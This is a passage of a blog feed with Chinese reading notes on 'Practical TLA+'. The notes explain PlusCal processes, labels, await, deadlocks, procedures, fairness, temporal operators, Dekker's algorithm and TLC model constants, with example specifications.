<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">with msg \in in_transit do</span><br><span class="line">	receiver := Append(receiver,msg);</span><br><span class="line">	in_transit := in_transit \ &#123;msg&#125;;</span><br><span class="line">	either</span><br><span class="line">		can_send := true;</span><br><span class="line">	or</span><br><span class="line">		skip;</span><br><span class="line">	end either;</span><br><span class="line">end with;</span><br></pre></td></tr></table></figure>
<p>​    但是这样却会报错<strong>Deadlock reached</strong>，这意味着spec进入到了一个玄学阶段，即啥都做不了，这样的一个阶段显然是很容易模拟出来的，关于这样的报错以后也会继续了解</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>​    这一章主要讲了PlusCal的一些基础知识，重点在于四种结构及其之间的相互组合和一些算法结构</p>
]]></content>
      <categories>
        <category>分布式系统</category>
        <category>TLA+</category>
      </categories>
      <tags>
        <tag>分布式系统</tag>
      </tags>
  </entry>
  <entry>
    <title>《Practical TLA+》阅读笔记（五）</title>
    <url>/2021/08/27/%E3%80%8APractical-TLA+%E3%80%8B%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%94%EF%BC%89/</url>
    <content><![CDATA[<h1 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h1><p>​    现在我们接触到的大多数程序都是独立于时间的，都是一个发生之后另外一个接着发生，我们可以根据系统的初始状态和几行代码具体描述出系统最终的状态。</p>
<p>​    但是很多程序都不是这样的简单地程序，在并发系统中，没有单一时间线，事实上会有以任意顺序发生在任何时候的事情，进而产生新时间线的断裂传播。设计并发系统需要很多进行推理的可能的行为，因此很难被正常设计。</p>
<p>​    在这一章我们将会合理使用TLA+，我们在之前已经用其中的<strong>either</strong>和<strong>with</strong>做过一些基本的不确定性行为，现在主要介绍<strong>processes</strong>和<strong>labels</strong>两种想法，这将会帮助我们测试高并发代码</p>
<h1 id="Labels"><a href="#Labels" class="headerlink" title="Labels"></a>Labels</h1><p>​    首先我们先说一下labels，labels一般不会去描述单一的过程，而失去描述并发系统</p>
<p>​    labels决定了spec的原子性，因为TLC在单个步骤中会执行标签中的所有步骤。执行完单个步骤后，TLC会检查不变量然后寻找下一个要执行的标签。TLC是会检查下一个标签集上的所有可能行为的<del>（或许类似于BFS）</del>，对于并发系统，TLC将会测试所有可用的下一步操作是否存在可能的错误</p>
<p>​    在将PlusCal编译成TLA+时，会产生一个新的变量pc，pc标记着我们目前所在的标签，如果pc = “A”的话，下一个步骤将会有A标签下的东西组成。在同一个过程中，我们可以用<strong>goto NameOfLabel</strong>进行标签跳转,<strong>值得注意的是，”Done”标签是每个过程最后的标签，不能作为自己的标签名，但是可以用goto跳转至Done</strong></p>
<p>​    贴标签要遵循以下的规则:</p>
<ol>
<li>在每一个过程的开始和每一个while前都要有一个标签</li>
<li>不能在macro或with内部放标签</li>
<li>在每一个goto后面必须有标签</li>
<li>如果在if或either之类的分支结构内部有标签，那么在控制结构的尾端也要有标签</li>
<li>在一个标签中不能指派同一个变量两次</li>
</ol>
<p>给一个例子解释一下最后一条</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Valid:</span><br><span class="line"> either x := 1;</span><br><span class="line"> or x := 2;</span><br><span class="line"> end either;</span><br><span class="line">Invalid:</span><br><span class="line"> x := 1;</span><br><span class="line"> x := 2;</span><br></pre></td></tr></table></figure>
<p>另外就是在处理函数的赋值时也不能这样，但是PlusCal给出了||操作，这样可以被认为是同时发生的。<strong>但是对于一般地变量还是会报错</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Valid:</span><br><span class="line"> struct.key1 = 1 ||</span><br><span class="line"> struct.key2 = 2;</span><br></pre></td></tr></table></figure>
<h1 id="Processes"><a href="#Processes" class="headerlink" title="Processes"></a>Processes</h1><p>​    编程中常见的一种情况是读写器模式（reader-writer pattern），这里有两个或多个异步进程通过共享通道进行通信的地方，其中一个用来编写信息，另一个主要是使用它们。我们接下来要模拟共享通道有界的情况</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----MODULE test-----</span><br><span class="line">EXTENDS TLC, Integers, Sequences</span><br><span class="line">CONSTANTS MaxQueueSize</span><br><span class="line">(*--algorithm message_queue</span><br><span class="line">variable</span><br><span class="line">    queue = &lt;&lt;&gt;&gt;;</span><br><span class="line">define</span><br><span class="line">    BoundedQueue == Len(queue) &lt;= MaxQueueSize</span><br><span class="line">end define;</span><br><span class="line">process writer = &quot;writer&quot;</span><br><span class="line">begin Writer:</span><br><span class="line">    while TRUE do</span><br><span class="line">        queue := Append(queue, &quot;msg&quot;);</span><br><span class="line">    end while;</span><br><span class="line">end process;</span><br><span class="line">process reader = &quot;reader&quot;</span><br><span class="line">variables</span><br><span class="line">    current_message = &quot;none&quot;;</span><br><span class="line">begin Read:</span><br><span class="line">     while TRUE do</span><br><span class="line">        current_message := Head(queue);</span><br><span class="line">        queue := Tail(queue);</span><br><span class="line">     end while;</span><br><span class="line">end process;</span><br><span class="line">end algorithm;*)</span><br></pre></td></tr></table></figure>
<p>​    我们通过关键字<strong>process</strong>来定义一个新的过程，每一个过程都需要分配一个值，所有的过程都必须使用标签</p>
<p>​    TLA+可以运行任意的一个过程，在每一个过程中都可以检查相应的不变量，另外就是本地变量（local variable），也就是在过程中定义的变量，比如reader过程中的current_message变量，她不可以被其他模块获取，当然，在这个过程中被使用的macro中可以使用该变量，本地变量也可以用\in来定义</p>
<p>​    现在运行上面的程序，很快就会报错，因为高并发的缘故，TLC可以先运行过程reader，这会先求queue的头部，但是它是空的！<strong>Head运算在空列表的情况下是没有意义的</strong>，当然也可以类比现实生活，这个bug是很容易修复的，只需要加一个判定即可，不过这里给出了一个表达式</p>
<h2 id="Await"><a href="#Await" class="headerlink" title="Await"></a>Await</h2><p>​    这个表达式也相当于一个判定，即await Expression，含义是如果Expression为真，运行后面的步骤，否则阻止其运行，当然也可以用<strong>when</strong>得到相同的用法，我们改写一下reader过程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">process reader = &quot;reader&quot;</span><br><span class="line">variable current_message = &quot;none&quot;;</span><br><span class="line">begin Read:</span><br><span class="line"> while TRUE do</span><br><span class="line"> await queue /= &lt;&lt;&gt;&gt;;</span><br><span class="line"> current_message := Head(queue);</span><br><span class="line"> queue := Tail(queue);</span><br><span class="line"> end while;</span><br><span class="line">end process;</span><br></pre></td></tr></table></figure>
<p>​    当队列为空时，意味着Read行为不能发生，这时唯一可以发生的就是Write行为，所以TLC接下来必须执行Write。事实上这样强迫阅读者在队列为空时一直等待，然而如果这样运行的话会报一个别的错误，即写的人会一直写下去，所以我们也可以加入一个等待语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">process writer = &quot;writer&quot;</span><br><span class="line">begin Write:</span><br><span class="line"> while TRUE do</span><br><span class="line"> queue := Append(queue, &quot;msg&quot;);</span><br><span class="line"> await Len(queue) &lt;= MaxQueueSize;</span><br><span class="line"> end while;</span><br><span class="line">end process;</span><br></pre></td></tr></table></figure>
<p>​    值得注意的是，这里的await语句加载了写文字的后面，如果先判断再写的话容易产生错误，即队列长度比最大长度大1，这是很显然的错误</p>
<h2 id="Deadlocks"><a href="#Deadlocks" class="headerlink" title="Deadlocks"></a>Deadlocks</h2><p>​    现在来埋之前挖的一个坑</p>
<p>​    上一节说到的await的使用有可能会导致所有的过程都不发生，例如我们可以在上一节的通信中加入读者有可能出现错误的这一缓解，即</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">macro add_to_queue(val) begin</span><br><span class="line">	await Len(queue) &lt; MaxQueueSize;</span><br><span class="line">	queue := Append(queue, val);</span><br><span class="line">end macro;</span><br><span class="line">process writer = &quot;writer&quot;</span><br><span class="line">begin Write:</span><br><span class="line"> while TRUE do</span><br><span class="line"> 	add_to_queue(&quot;msg&quot;);</span><br><span class="line"> end while;</span><br><span class="line">end process;</span><br><span class="line">process reader = &quot;reader&quot;</span><br><span class="line">variable current_message = &quot;none&quot;;</span><br><span class="line">begin Read:</span><br><span class="line">  while TRUE do</span><br><span class="line">  	await queue /= &lt;&lt;&gt;&gt;;</span><br><span class="line">  	current_message := Head(queue);</span><br><span class="line">  	queue := Tail(queue);</span><br><span class="line">  either</span><br><span class="line"> 	skip;</span><br><span class="line">  or</span><br><span class="line"> 	NotifyFailure:</span><br><span class="line"> 		current_message := &quot;none&quot;;</span><br><span class="line"> 		add_to_queue(&quot;fail&quot;);</span><br><span class="line">  end either;</span><br><span class="line"> end while;</span><br><span class="line">end process;</span><br></pre></td></tr></table></figure>
<p>​    这里采用了either来模拟这种情况，另外就是其中的做出操作的这种情况必须采用一个标签，<strong>这是因为其中的两个变量我们都已经在这个步骤中操作过了，而一个步骤中只能对一个变量进行一次分配，所以需要添加标签来更改步骤层次</strong>，另外就是因为either的一个分支中已经有了一个标签，所以如果想在过程中写另外的一些东西的话需要在either标签后再定义新的标签，但是这里是不需要的</p>
<p>​    一旦运行，就会报一个新的错误，即<strong>Deadlock Reached</strong>，这指的是spec中的所有过程都无法采取动作的情况，这通常是因为await所造成的错误，但是像with x \in S，如果S是空集的话也会报错，通常这是一个很坏的错误，但是如果spec中不考虑这一点的话，可以在Model Overview &gt; What to Check? &gt; Deadlock中修改</p>
<h3 id="Process-Sets"><a href="#Process-Sets" class="headerlink" title="Process Sets"></a>Process Sets</h3><p>​    通常的解决这一错误的办法是加入更多的读者，但是仔细想一下就会知道这样的方法根本没用啊！！！因为本身根据TLC的特性，报错是肯定的，但是通过增加更多的读者这一方法在实际生产中肯定是可以大幅减少可能出现的错误产生</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">process reader \in &#123;&quot;r1&quot;, &quot;r2&quot;&#125;</span><br><span class="line">variable current_message = &quot;none&quot;;</span><br><span class="line">begin Read:</span><br><span class="line"> while TRUE do</span><br><span class="line"> 	await queue /= &lt;&lt;&gt;&gt;;</span><br><span class="line"> 	current_message := Head(queue);</span><br><span class="line"> 	queue := Tail(queue);</span><br><span class="line"> either</span><br><span class="line"> 	skip;</span><br><span class="line"> or</span><br><span class="line"> 	NotifyFailure:</span><br><span class="line"> 		current_message := &quot;none&quot;;</span><br><span class="line"> 		add_to_queue(self);</span><br><span class="line">  end either;</span><br><span class="line"> end while;</span><br><span class="line">end process;</span><br></pre></td></tr></table></figure>
<p>​    这里的第一行实际上就是定义了两个过程，其中的self就是当前过程的名字</p>
<p>​    <strong>值得注意的是，所有的过程名字必须是可比的，这里因为writer是字符串，所以reader要么是字符串的集合，要么是模型值的集合</strong></p>
<h1 id="Procedures"><a href="#Procedures" class="headerlink" title="Procedures"></a>Procedures</h1><p>​    现在有这样一个需求，即可以在多个过程之间共享一个多步骤的操作，这里不能用宏，因为宏中不能包含标签，所以我们引入了<strong>procedures</strong>，下面我们给出的spec就像是用procedure代替了macro一样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">procedure add_to_queue(val=&quot;&quot;) begin</span><br><span class="line">	Add:</span><br><span class="line">		await Len(queue) &lt; MaxQueueSize;</span><br><span class="line">		queue := Append(queue, val);</span><br><span class="line">		return;</span><br><span class="line">end procedure;</span><br><span class="line">process writer = &quot;writer&quot;</span><br><span class="line">begin Write:</span><br><span class="line">	while TRUE do</span><br><span class="line">		call add_to_queue(&quot;msg&quot;);</span><br><span class="line">	end while;</span><br><span class="line">end process;</span><br><span class="line">process reader \in &#123;&quot;r1&quot;, &quot;r2&quot;&#125;</span><br><span class="line">variable current_message = &quot;none&quot;;</span><br><span class="line">begin Read:</span><br><span class="line">	while TRUE do</span><br><span class="line">		await queue /= &lt;&lt;&gt;&gt;;</span><br><span class="line">		current_message := Head(queue);</span><br><span class="line"> 		queue := Tail(queue);</span><br><span class="line"> 		either</span><br><span class="line"> 			skip;</span><br><span class="line"> 		or</span><br><span class="line"> 			NotifyFailure:</span><br><span class="line"> 				current_message := &quot;none&quot;;</span><br><span class="line"> 				call add_to_queue(self);</span><br><span class="line"> 		end either;</span><br><span class="line">	end while;</span><br><span class="line">end process;</span><br></pre></td></tr></table></figure>
<p>​    运行的话会产生同样的deadlock，procedure和macro的语法是差不多的，但是他之中可以有标签，在procedure中也可以定义局部变量，不过只能用<strong>=</strong>去定义，最后用return来结束这一过程，，但是它没有任何的返回值，然后在过程中我们可以通过<strong>call</strong>来使用程序，被调用的过程必须紧跟在标签、封闭块的结尾、goto或return中</p>
<p>​    另外就是这个东西必须在宏之后定义，在process之前定义。</p>
<p>​    <strong>值得注意的是在使用过程集合时，如果其中使用了procedure或者宏的话，也可以使用self</strong></p>
<h1 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h1><p>​    该例子主要用来模拟多个客户端共享一些实时更新的资源</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>​    主要介绍了TLA+在高并发程序中的应用</p>
]]></content>
      <categories>
        <category>分布式系统</category>
        <category>TLA+</category>
      </categories>
      <tags>
        <tag>分布式系统</tag>
      </tags>
  </entry>
  <entry>
    <title>《Practical TLA+》阅读笔记（六）</title>
    <url>/2021/09/02/%E3%80%8APractical-TLA+%E3%80%8B%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%EF%BC%88%E5%85%AD%EF%BC%89/</url>
    <content><![CDATA[<h1 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h1><p>​    到目前为止我们测试的是在一个行为中的任何情况下始终为真的不变量（<strong>invariants</strong>），接下来将会介绍时间属性（<strong>temporal properties</strong>），时间属性是关于行为自身的一些陈述，它给出了更多的可以用来检测的种类，下面给出一些例子</p>
<ol>
<li>算法是否始终有效？</li>
<li>队列中的所有信息都会被处理吗？</li>
<li>如果系统被扰乱，它能随着时间到达稳定状态吗？</li>
<li>数据库最终是否兼容？</li>
</ol>
<p>​    时间属性更加有力但是也更难被满足，系统给出了关于时间属性的新的错误编码</p>
<h1 id="Termination"><a href="#Termination" class="headerlink" title="Termination"></a>Termination</h1><p>​    这是最简单的一种时间属性，它要求算法最终必须结束，如果算法在过程中出错或者进入死循环，就会不满足这一点。下面给出一个例子来详细说明</p>
<p>​    现在在交通灯前有一个车，系统中有两个过程，交通灯轮流为红色和绿色，下面给出Pluscal程序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---- MODULE traffic -----</span><br><span class="line">NextColor(c) == CASE c = &quot;red&quot; -&gt; &quot;green&quot;</span><br><span class="line">                  [] c = &quot;green&quot; -&gt; &quot;red&quot;</span><br><span class="line">(*--algorithm traffic</span><br><span class="line">variables</span><br><span class="line">    at_light = TRUE;</span><br><span class="line">    light = &quot;red&quot;;</span><br><span class="line">process light = &quot;light&quot;</span><br><span class="line">begin</span><br><span class="line">    Cycle:</span><br><span class="line">        while at_light do</span><br><span class="line">            light := NextColor(light);</span><br><span class="line">        end while;</span><br><span class="line">end process;</span><br><span class="line">process car = &quot;car&quot;</span><br><span class="line">begin</span><br><span class="line">    Drive:</span><br><span class="line">        when light = &quot;green&quot;;</span><br><span class="line">        at_light := FALSE;</span><br><span class="line">end process;</span><br><span class="line">end algorithm;*)</span><br><span class="line">====</span><br></pre></td></tr></table></figure>
<p>​    如果不添加时间属性的话，会发现程序运行的非常顺利，然而一旦添加Termination属性，就会发现程序报错，也就是我们前面提到过的<strong>Stuttering</strong></p>
<h2 id="Stuttering"><a href="#Stuttering" class="headerlink" title="Stuttering"></a>Stuttering</h2><p>​    先说一下TLA+，TLA+的全程是<strong>Temporal Logic of Actions</strong>，即行为的时间逻辑，TLC运作的过程也很简单，即从所有可以运行的标签中选择一个可以运行的去执行。然而，如果没有任何一个标签可以去执行，我们就叫它<strong>stuttering</strong>，在大多数情况，如果没有行为发生，所有事物和之前的相同，stuttering不会起什么作用，但是有一个特殊的情况，即spec一直保持着stuttering的情况，并且不会采取任何的行为，我们认为spec在时间上被冻结了</p>
<p>​    到目前为止，stuttering并不重要。我们所有的不变量检查都是安全检验，即保证模型不会到达无效状态。但是stuttering是始终在有效状态上的，所以TLC没有理由去尝试stuttering，大多数时间属性所做的是活性检验（<strong>liveness checks</strong>），这保证了系统最终是我期望的形态。在这里，TLC不会停止核查Cycle，所以spec始终不会终止，进而造成了TLC</p>
<p>​    有时候Stuttering也是有用的，它可以1用来代表服务器崩溃、进程超时或等待的信号永远不会到来。最好TLA+默认一切都有可能崩溃，这样可以检查出更多的错误，如果需要排除stuttering，需要加入fairness</p>
<p><strong><em>这里说一下stuttering和deadlock的区别，两者定义看起来差不多，似乎都是spec没有可做的行为了，但是其实差别很大，因为导致这种情况出现的原因不同，deadlock是由于await命令阻止了所有进程有下一步行为，但是stuttering是可以有的，但是所产生的行为对前后状态没有区别</em></strong></p>
<h2 id="Fairness，Weak-and-Strong"><a href="#Fairness，Weak-and-Strong" class="headerlink" title="Fairness，Weak and Strong"></a>Fairness，Weak and Strong</h2><p>​    weak和strong是两种不同的fairness。</p>
<p>​    weakly fair action指的是如果它被（连续）启用，那么最终一定会发生，我们可以通过定义过程来让其中所有的标签都是weak，如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fair process light = &quot;light&quot;</span><br><span class="line">begin</span><br><span class="line"> Cycle:</span><br><span class="line"> 	while at_light do</span><br><span class="line"> 		light := NextColor(light);</span><br><span class="line"> 	end while;</span><br><span class="line">end process;</span><br><span class="line">fair process car = &quot;car&quot;</span><br><span class="line">begin</span><br><span class="line"> Drive:</span><br><span class="line"> 	when light = &quot;green&quot;;</span><br><span class="line"> 	at_light := FALSE;</span><br><span class="line">end process;</span><br></pre></td></tr></table></figure>
<p>​    仔细分析一下如果只有一个过程是fair的会出现的情况，如果只有light是fair的，那最终灯会转变为绿色，但是车子就不会动了，如果只有car是fair的也是同理的</p>
<p>​    但是这样依旧会报错，因为有一种情况没有考虑，即如果交通灯始终转换，那么司机的行为将会在能走和不能走之间循环，但是弱公平是保证了可以发生的行为最终一定会发生，即司机卡在了这里</p>
<p>​    接下来就要引入强公平，强公平指的是如果程序被无限频繁启用，最终就一定会发生，这个发生可以发生在不启用的时间段，我们用fair+定义强公平过程</p>
<p>​    现在我们最终满足了最后一种情况，并且程序正常运作了</p>
<h1 id="The-Temporal-Operators"><a href="#The-Temporal-Operators" class="headerlink" title="The Temporal Operators"></a>The Temporal Operators</h1><p>​    首先简要介绍一些操作符，假定P和Q都是布尔表达式</p>
<h2 id><a href="#" class="headerlink" title="[]"></a>[]</h2><p>​    它的意思是总是（<strong>always</strong>），[]P指的是P对于所有的状态都为真，然后这就是在TLC中的一个类似的设计，即说P是一个常量和说[]P是一个时间属性是一样的，但是前者是后者的一个优化，因为TLC用来检查invariants的算法跑得更快。正因如此用它的情况其实也比较少。</p>
<p>​    也可以将他和另外的一些运算结合，例如~[]P，表示P至少在一种情况下为假</p>
<h2 id="lt-gt"><a href="#lt-gt" class="headerlink" title="&lt;&gt;"></a>&lt;&gt;</h2><p>​    它的意思是终于（<strong>eventually</strong>），&lt;&gt;P意味着对于每一种行为，至少有一种情况让P为真</p>
<p>​    在交通灯的例子中，&lt;&gt;(light = “green”)是可满足的，因为对于每一种行为肯定都存在着这样的时刻语句成立，但是如果改写成下面的样子就不会成立</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">variables</span><br><span class="line">	at_light = TRUE;</span><br><span class="line">	light = &quot;green&quot;;</span><br></pre></td></tr></table></figure>
<p>​    在这种情况下&lt;&gt;(light = “red”)就是不满足的，因为有着一种情况可以让所有的灯都不为红色</p>
<p>​    ~&lt;&gt;P表示P恒不为真，注意到这和[]~P其实是一样的</p>
<p><strong><em>Termination可以用这些表达式来定义</em></strong></p>
<h2 id="gt"><a href="#gt" class="headerlink" title="~&gt;"></a>~&gt;</h2><p>​    他的意思是导致，P~&gt;Q表示如果一些状态使P为真，那Q一定围在现在或者将来的某些状态为真，就和蕴含差不多，即使P在后来为假，Q也需要发生</p>
<h2 id="lt-gt-and-lt-gt"><a href="#lt-gt-and-lt-gt" class="headerlink" title="[]&lt;&gt; and &lt;&gt;[]"></a>[]&lt;&gt; and &lt;&gt;[]</h2><p>​    []&lt;&gt;P意味着P总是最终为真，&lt;&gt;[]P意味着P最终总是为真，<del>看起来好费解</del></p>
<p>​    对于一个有限的spec，这两者的意思是一样的，对于无限的spec，&lt;&gt;[]P意味着这有一些点P变成真并且永远保持为真，而[]&lt;&gt;P表示如果P曾经变成过假，它最终会再变成真，也有这样的等式，[]&lt;&gt;P &lt;=&gt; (~P ~&gt; P)</p>
<p><strong><em>注意由于&lt;&gt;的原因，在当前的版本下，TLC无法检查带有&lt;&gt;的属性的一部分的变量集的成员的资格，所以需要注意写法</em></strong></p>
<h1 id="Limitations-of-Liveness"><a href="#Limitations-of-Liveness" class="headerlink" title="Limitations of Liveness"></a>Limitations of Liveness</h1><p>​    事实上，时间属性其实很少需要，大多数时候检查不变量就完全可以了</p>
<p>​    从实用性的角度来说，它的主要限制之处在于实在是太慢了，TLC使用的核查时间属性的算法和核查不变量的算法是不一样的，前者很慢而且不是并行的</p>
<p>​    可以将时间属性放在和不变量不同的模块中，这样可以在检查时间属性之前更快的测试不变量，还可以在更小的域上测试活跃度</p>
<p>​    另外其很重要的一个限制就是不能和对称集结合起来。在TLC跳过冗余状态优化测试集时可能会导致它错过活跃度错误</p>
<h1 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h1><p>​    这章的例子是Dekker算法，这是第一个成功让两个线程共享一份资源并且没有竞争条件，并且保证了每一个线程都可以不同时并且不使用任何具体的CPU特征来正常展现更新</p>
<p>​    和我们之前写过的spec不一样的是，这里的原子行为是单个CPU指令</p>
<p>​    另外就可以来详细的编写，首先对于其中的过程，思路可以直接模拟，代码见下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXTENDS TLC, Integers</span><br><span class="line">CONSTANT Threads</span><br><span class="line">(*--algorithm dekker</span><br><span class="line">variables flag = [t \in Threads |-&gt; FALSE];</span><br><span class="line">fair process thread \in Threads</span><br><span class="line">begin</span><br><span class="line"> P1: flag[self] := TRUE;</span><br><span class="line"> \* all threads except self are false</span><br><span class="line"> P2: await \A t \in Threads \ &#123;self&#125;: ~flag[t];</span><br><span class="line"> CS: skip;</span><br><span class="line"> P3: flag[self] := FALSE;</span><br><span class="line"> P4: goto P1;</span><br><span class="line">end process;</span><br><span class="line">end algorithm; *)</span><br></pre></td></tr></table></figure>
<p>​    然后就是对于其中缓冲区的检查，要求至多有一个进程在缓冲区中，写法很多，可以直译，如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AtMostOneCritical ==</span><br><span class="line"> \/ \A t \in Threads: pc[t] /= &quot;CS&quot;</span><br><span class="line"> \/ \E t \in Threads:</span><br><span class="line"> 	/\ pc[t] = &quot;CS&quot;</span><br><span class="line"> 	/\ \A t2 \in Threads \ &#123;t&#125;: pc[t2] /= &quot;CS&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>​    也可以转化一下，即任意的两个线程，如果都在缓冲区，那么线程相同</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AtMostOneCritical == </span><br><span class="line">	\A t1,t2 \in Threads:</span><br><span class="line">		t1 /= t2 =&gt; ~(pc[t1] = &quot;CS&quot; /\ pc[t2] = &quot;CS&quot;)</span><br></pre></td></tr></table></figure>
<p>​    要注意的是这里用到了pc，所以需要在编译之后添加到编译内容中</p>
<p>​    运行之后报错，这是很显然的，因为我们中间没有使用循环，导致两者都翻转之后产生错误</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fair process thread \in Threads</span><br><span class="line">begin</span><br><span class="line"> P1: flag[self] := TRUE;</span><br><span class="line"> P2:</span><br><span class="line"> while \E t \in Threads \ &#123;self&#125;: flag[t] do</span><br><span class="line"> P2_1: flag[self] := FALSE;</span><br><span class="line"> P2_2: flag[self] := TRUE;</span><br><span class="line"> end while;</span><br><span class="line"> CS: skip;</span><br><span class="line"> P3: flag[self] := FALSE;</span><br><span class="line"> P4: goto P1;</span><br><span class="line">end process;</span><br></pre></td></tr></table></figure>
<p>​    <del>感觉这里写的Dekker算法和我百度的不太一样呢</del></p>
<p>​    我们以上做的工作是表示它不会deadlock，并且不会因为具有两个线程而产生安全问题，我们也需要展现所有的线程都成功的到达了关键的部分，这时候就要用到之前的时间属性了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Liveness == </span><br><span class="line">	\A t \in Threads:</span><br><span class="line">		&lt;&gt;(pc[t] = &quot;CS&quot;)</span><br></pre></td></tr></table></figure>
<p>​    但是加进去就会报错，因为此时所有的线程在P2中死循环了，我们将其称之为<strong>livelock</strong></p>
<p>​    然后才是Dekker大大给出的正确算法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXTENDS TLC, Integers</span><br><span class="line">CONSTANT Threads</span><br><span class="line">(*--algorithm dekker</span><br><span class="line">variables</span><br><span class="line">    flag = [t \in Threads |-&gt; FALSE];</span><br><span class="line">    next_thread \in Threads;</span><br><span class="line">fair process thread \in Threads</span><br><span class="line">begin</span><br><span class="line">    P1: flag[self] := TRUE;</span><br><span class="line">    P2: </span><br><span class="line">        while \E t \in Threads \ &#123;self&#125;: flag[t] do</span><br><span class="line">          P2_1:</span><br><span class="line">            if next_thread /= self then</span><br><span class="line">            P2_1_1: flag[self] := FALSE;</span><br><span class="line">            P2_1_2: await next_thread = self;</span><br><span class="line">            P2_1_3: flag[self] := TRUE;</span><br><span class="line">            end if;</span><br><span class="line">        end while;</span><br><span class="line">    CS: skip;</span><br><span class="line">    P3: with t \in Threads \ &#123;self&#125; do</span><br><span class="line">            next_thread := t;</span><br><span class="line">        end with;</span><br><span class="line">    P4: goto P1;</span><br><span class="line">end process;</span><br><span class="line">end algorithm;*) </span><br></pre></td></tr></table></figure>
<p>​    不过这个算法是有一定的错误的</p>
<p>​    首先，如果线程变成三个，就会出错，其中的两个到达CS，但是另外一个没有，这称之为<strong>resource starvation</strong></p>
<p>​    另一个问题就是他的弹性较差，如果其中一个出错也会导致另外一个出错</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>​    这一部分就这样结束了，这意味着第一部分结束了，Pluscal的所有语法都介绍完毕，接下来的第二部分主要是介绍TLA+的应用</p>
]]></content>
      <categories>
        <category>分布式系统</category>
        <category>TLA+</category>
      </categories>
      <tags>
        <tag>分布式系统</tag>
      </tags>
  </entry>
  <entry>
    <title>《Practical TLA+》阅读笔记（四）</title>
    <url>/2021/08/26/%E3%80%8APractical-TLA+%E3%80%8B%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%EF%BC%88%E5%9B%9B%EF%BC%89/</url>
    <content><![CDATA[<h1 id="总述"><a href="#总述" class="headerlink" title="总述"></a>总述</h1><p>​    我们在之前已经写过一些比较复杂的规范，但是我们的模式是非常僵化的，用了很多硬编码值，在这一章中，我们将会使用TLC配置来进行简化</p>
<h1 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h1><p>​    我们有时会希望在运行中改变规范的参数，或许是想用小数据找出明显的错误，然后再用大数据找一些别的错误，这个时候需要动态修改TLC的参数，我们可以通过添加CONSTANTS来做到这一点，这是一些定义在模型内而不是规范内的值，可以按照如下方式添加</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXTENDS Integers, TLC</span><br><span class="line">CONSTANTS Capacity, Items, SizeRange, ValueRange</span><br></pre></td></tr></table></figure>
<p>​    需要注意的是，我们不能在Spec中给常量赋任何值，而是需要<strong>在“Model Overview”页面中的“What Is the Model”中进行赋值</strong>，我们有三种赋值的选择，下面逐一介绍，另外就是我们用<strong>Contants -&gt; val</strong>进行赋值</p>
<h2 id="Ordinary-Assignment"><a href="#Ordinary-Assignment" class="headerlink" title="Ordinary Assignment"></a>Ordinary Assignment</h2><p>​    我们可以设置TLA+的任何类型作为常量，赋值只需要直接赋值即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Capacity &lt;- 7</span><br><span class="line">ValueRange &lt;- 0..3</span><br><span class="line">SizeRange &lt;- 1..4</span><br><span class="line">Items &lt;- &#123;&quot;a&quot;, &quot;b&quot;, &quot;c&quot;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Model-Values"><a href="#Model-Values" class="headerlink" title="Model Values"></a>Model Values</h2><p>​    如果我们这样分配的话，这个常量将会变成一个新的类型，并且这个类型只和它自身相等，即使设置了两个相同的值M和N，也有M /= N</p>
<p>​    由于比较不同的值会认为规范失败，所以使用NULL是一件比较方便的事情</p>
<h2 id="Sets-of-Model-Values"><a href="#Sets-of-Model-Values" class="headerlink" title="Sets of Model Values"></a>Sets of Model Values</h2><p>​    我们可以指派模型值的集合，这里主要可以用来优化一些由于对称性导致的资源损耗</p>
<p>​    以背包问题为例，我们给出Items &lt;- [ model value ]{i1, i2, i3}</p>
<p>​    但是这个时候其实在程序内部有大量的资源损耗，因为这其实是轮换对称的，如果我们告诉TLC轮换对称这一事实的话，程序将会大幅度优化</p>
<p>​    用对称性往往只需要考虑情况的一半，这会让我们的程序更加高效，但是需要考虑是否安全</p>
<h2 id="ASSUME"><a href="#ASSUME" class="headerlink" title="ASSUME"></a>ASSUME</h2><p>​    ASSUME是一种针对常量的断言，比如如果已经将Values作为了数字集合，就不希望再将它指派成字符串列表，如果出现这种情况，ASSUME就会阻止spec继续运行</p>
